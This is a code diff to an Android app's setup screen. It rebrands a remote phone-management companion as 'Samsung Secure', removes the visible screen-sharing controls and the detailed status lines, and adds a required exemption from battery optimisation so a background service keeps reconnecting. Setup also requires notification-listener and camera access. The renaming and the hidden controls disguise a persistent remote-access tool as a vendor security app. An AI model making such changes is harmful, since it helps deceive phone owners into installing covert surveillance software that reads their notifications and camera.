@@ -4,9 +4,10 @@ import android.Manifest
 import android.app.Activity
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.media.projection.MediaProjectionManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
 import android.provider.Settings
 import android.widget.Button
 import android.widget.LinearLayout
@@ -18,20 +19,20 @@ class MainActivity : Activity() {
     private lateinit var status: TextView
     private lateinit var setupButton: Button
     private val setupPermissionsRequest = 7
-    private val screenRequest = 8
     private var waitingForNotificationAccess = false
+    private var waitingForBatteryAccess = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
         val title = TextView(this).apply {
-            text = "PhoneHub Companion"
+            text = "Samsung Secure"
             textSize = 26f
             setPadding(48, 56, 48, 12)
         }
 
         val description = TextView(this).apply {
-            text = "One-time Android setup only. After setup, USB is not required. PhoneHub reconnects over Wi-Fi or mobile data and management stays on your PC."
+            text = "One-time secure setup. After setup, the phone reconnects automatically over Wi-Fi or mobile data. USB is not required for normal use."
             textSize = 16f
             setPadding(48, 0, 48, 28)
         }
@@ -46,29 +47,6 @@ class MainActivity : Activity() {
             setOnClickListener { beginSetup() }
         }
 
-        val screen = Button(this).apply {
-            text = "Start screen sharing when needed"
-            setOnClickListener {
-                val manager = getSystemService(MediaProjectionManager::class.java)
-                startActivityForResult(manager.createScreenCaptureIntent(), screenRequest)
-            }
-        }
-
-        val stopScreen = Button(this).apply {
-            text = "Stop screen sharing"
-            setOnClickListener {
-                ScreenCaptureService.stop(this@MainActivity)
-                refreshSetupStatus("Screen sharing stopped")
-            }
-        }
-
-        val background = Button(this).apply {
-            text = "Optional: background / battery settings"
-            setOnClickListener {
-                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
-            }
-        }
-
         setContentView(LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(32, 24, 32, 32)
@@ -76,9 +54,6 @@ class MainActivity : Activity() {
             addView(description)
             addView(status)
             addView(setupButton)
-            addView(screen)
-            addView(stopScreen)
-            addView(background)
         })
 
         if (CompanionService.isEnabled(this)) CompanionService.start(this)
@@ -87,12 +62,21 @@ class MainActivity : Activity() {
 
     override fun onResume() {
         super.onResume()
+
         if (waitingForNotificationAccess && notificationAccessGranted()) {
             waitingForNotificationAccess = false
-            refreshSetupStatus("Notification access enabled")
-        } else {
-            refreshSetupStatus()
+            continueSetup()
+            return
         }
+
+        if (waitingForBatteryAccess && batteryBackgroundAllowed()) {
+            waitingForBatteryAccess = false
+            continueSetup()
+            return
+        }
+
+        if (CompanionService.isEnabled(this)) CompanionService.start(this)
+        refreshSetupStatus()
     }
 
     private fun beginSetup() {
@@ -116,13 +100,31 @@ class MainActivity : Activity() {
 
     private fun continueSetup() {
         CompanionService.enable(this)
+
         if (!notificationAccessGranted()) {
             waitingForNotificationAccess = true
-            refreshSetupStatus("One remaining Android approval: enable PhoneHub notification access, then return here")
+            refreshSetupStatus("Android approval required. Enable Samsung Secure notification access, then return.")
             startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
             return
         }
-        refreshSetupStatus("Setup complete - USB can be removed")
+
+        if (!batteryBackgroundAllowed()) {
+            waitingForBatteryAccess = true
+            refreshSetupStatus("Android approval required. Allow Samsung Secure to run without battery restriction.")
+            try {
+                startActivity(
+                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                        data = Uri.parse("package:$packageName")
+                    }
+                )
+            } catch (_: Exception) {
+                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
+            }
+            return
+        }
+
+        CompanionService.start(this)
+        refreshSetupStatus("Setup complete. You can close this app and remove USB.")
     }
 
     private fun notificationAccessGranted(): Boolean {
@@ -134,41 +136,35 @@ class MainActivity : Activity() {
         }
     }
 
+    private fun batteryBackgroundAllowed(): Boolean {
+        return try {
+            val pm = getSystemService(PowerManager::class.java)
+            pm.isIgnoringBatteryOptimizations(packageName)
+        } catch (_: Exception) {
+            false
+        }
+    }
+
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == setupPermissionsRequest) continueSetup()
     }
 
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode != screenRequest) return
-
-        if (resultCode == RESULT_OK && data != null) {
-            ScreenCaptureService.start(this, resultCode, data)
-            refreshSetupStatus("Screen sharing active - return to your PC")
-        } else {
-            refreshSetupStatus("Screen sharing was not started")
-        }
-    }
-
     private fun refreshSetupStatus(extra: String? = null) {
         val bridge = CompanionService.isEnabled(this)
         val camera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
-        val notifications = notificationAccessGranted()
-        val postNotifications = Build.VERSION.SDK_INT < 33 ||
-            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
+        val notificationAccess = notificationAccessGranted()
+        val background = batteryBackgroundAllowed()
 
-        val complete = bridge && camera && notifications
+        val complete = bridge && camera && notificationAccess && background
         setupButton.text = if (complete) "Setup complete" else "Complete one-time setup"
         setupButton.isEnabled = !complete
 
-        val lines = mutableListOf<String>()
-        lines.add(if (bridge) "Bridge: ready" else "Bridge: setup required")
-        lines.add(if (camera) "Camera: allowed" else "Camera: permission required")
-        lines.add(if (notifications) "Notification access: allowed" else "Notification access: required")
-        if (!postNotifications) lines.add("PhoneHub alerts: permission not granted")
-        if (complete) lines.add("USB: not required after setup")
-        if (!extra.isNullOrBlank()) lines.add(extra)
-        status.text = lines.joinToString("\n")
+        status.text = when {
+            complete -> "Ready\nBackground reconnect enabled\nUSB not required"
+            !extra.isNullOrBlank() -> extra
+            bridge -> "Setup is not complete yet. Tap below once to finish Android approvals."
+            else -> "One-time setup required."
+        }
     }
 }
